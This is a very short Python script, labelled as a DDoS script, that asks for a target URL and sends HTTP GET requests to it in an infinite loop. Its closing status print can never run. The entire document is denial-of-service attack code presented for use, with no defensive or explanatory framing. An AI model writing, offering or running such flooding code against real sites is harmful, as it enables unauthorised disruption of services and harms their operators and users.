#DDos with python script
import requests

target = input()

while True:
  r = requests.get(target)

print(r.status_code)
